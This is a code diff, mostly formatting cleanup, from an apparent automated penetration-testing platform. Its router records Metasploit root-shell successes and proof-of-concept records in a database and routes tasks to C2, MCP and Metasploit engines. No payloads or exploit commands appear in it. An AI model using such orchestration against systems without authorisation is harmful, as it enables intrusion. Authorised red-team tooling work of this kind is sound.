             shell_fact_id = str(uuid.uuid4())
@@ -2206,17 +2590,20 @@ class EngineRouter:
                 "source_target_id, operation_id, score, collected_at) "
                 "VALUES ($1, 'credential.root_shell', $2, 'host', $3, $4, 1, $5) "
                 "ON CONFLICT DO NOTHING",
-                shell_fact_id, f"metasploit:{service_name}:{output[:100]}",
-                target_id, operation_id, completed_ts,
+                shell_fact_id,
+                f"metasploit:{service_name}:{output[:100]}",
+                target_id,
+                operation_id,
+                completed_ts,
             )
             facts_count = 1
             await db.execute(
-                "UPDATE operations SET techniques_executed = techniques_executed + 1 "
-                "WHERE id = $1",
+                "UPDATE operations SET techniques_executed = techniques_executed + 1 WHERE id = $1",
                 operation_id,
             )
             # SPEC-043: Record PoC for Metasploit success
             from app.models.poc_record import PoCRecord  # noqa: PLC0415
+
             poc = PoCRecord(
                 technique_id=technique_id,
                 target_ip=target_ip,
@@ -2233,15 +2620,25 @@ class EngineRouter:
                 "source_target_id, operation_id, score, collected_at) "
                 "VALUES ($1, $2, $3, 'poc', $4, $5, $6, 1, $7) "
                 "ON CONFLICT DO NOTHING",
-                poc_fact_id, f"poc.{technique_id}", poc.to_json(),
-                technique_id, target_id, operation_id,
+                poc_fact_id,
+                f"poc.{technique_id}",
+                poc.to_json(),
+                technique_id,
+                target_id,
+                operation_id,
                 datetime.now(timezone.utc),
             )
 
-        await self._ws.broadcast(operation_id, "execution.update", {
-            "id": exec_id, "technique_id": technique_id,
-            "status": status, "engine": msf_engine_label,
-        })
+        await self._ws.broadcast(
+            operation_id,
+            "execution.update",
+            {
+                "id": exec_id,
+                "technique_id": technique_id,
+                "status": status,
+                "engine": msf_engine_label,
+            },
+        )
 
         return {
             "execution_id": exec_id,
@@ -2281,11 +2678,12 @@ class EngineRouter:
         Bug fix: previously always returned self._c2_engine regardless of engine arg.
         """
         from app.clients.metasploit_client import MetasploitEngineAdapter
+
         clients: dict[str, BaseEngineClient | None] = {
-            "c2":         self._c2_engine,
-            "mock":       self._c2_engine,
-            "mcp":        self._mcp_engine,
-            "mcp_ssh":    self._mcp_engine,
+            "c2": self._c2_engine,
+            "mock": self._c2_engine,
+            "mcp": self._mcp_engine,
+            "mcp_ssh": self._mcp_engine,
             "metasploit": MetasploitEngineAdapter(),
         }
         client = clients.get(engine)
